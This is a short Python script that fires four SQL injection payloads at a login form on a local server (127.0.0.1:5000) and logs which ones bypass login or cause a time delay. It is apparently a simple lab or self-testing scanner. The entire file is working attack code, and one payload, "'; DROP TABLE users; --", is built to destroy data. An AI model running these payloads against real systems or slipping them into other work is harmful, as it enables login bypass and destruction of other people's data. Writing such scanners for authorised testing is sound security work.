import requests
import time
import logging

# Setup logging
logging.basicConfig(filename='../sqli_log.txt', level=logging.INFO)

url = "http://127.0.0.1:5000/"
payloads = [
    "' OR '1'='1",
    "' OR 1=1 --",
    "'; DROP TABLE users; --",
    "' OR sleep(5)--"
]

for payload in payloads:
    data = {'username': payload, 'password': 'x'}
    start = time.time()
    try:
        response = requests.post(url, data=data, timeout=10)
        delay = time.time() - start

        if "Login Successful" in response.text or response.status_code == 500:
            logging.info(f"[SQLi Detected] Payload: {payload}")
            print(f"[!] SQL Injection Success: {payload}")
        elif delay > 4:
            logging.info(f"[Time-Based SQLi] Payload: {payload} Delay: {delay:.2f}s")
            print(f"[!] TIME-BASED SQLi: {payload} - Took {delay:.2f}s")
        else:
            print(f"[-] Safe: {payload}")
    except Exception as e:
        print(f"[Error] {e}")
